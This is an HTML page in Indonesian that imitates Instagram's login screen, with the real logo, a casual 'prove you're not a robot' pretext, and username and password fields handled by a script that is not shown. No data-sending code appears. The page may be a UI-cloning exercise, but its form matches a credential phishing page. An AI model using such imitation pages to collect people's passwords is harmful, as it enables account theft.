<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Instagram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <!-- Logo Instagram -->
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/640px-Instagram_icon.png" alt="Instagram Logo" class="logo">
        </div>

        <!-- Teks di bawah logo -->
        <p class="login-text">Login dulu bro biar gw tau lo bukan robot</p>

        <!-- Form Login -->
        <form class="login-form" id="loginForm" onsubmit="return handleLogin(event)">
            <input type="text" id="username" placeholder="Nomor telepon, email, atau nama pengguna" class="input-field" required>
            <input type="password" id="password" placeholder="Kata sandi" class="input-field" required>
            <button type="submit" class="login-btn">Masuk</button>
        </form>

        <!-- Lupa kata sandi -->
        <div class="forgot-password">
            <a href="#">Lupa kata sandi?</a>
        </div>

        <!-- Pembagian atau alternatif login -->
        <div class="divider">
            <span class="divider-line"></span>
            <span class="divider-text">ATAU</span>
            <span class="divider-line"></span>
        </div>

        <!-- Tidak punya akun -->
        <div class="signup-link">
            <p>Belum punya akun? <a href="#">Daftar</a></p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
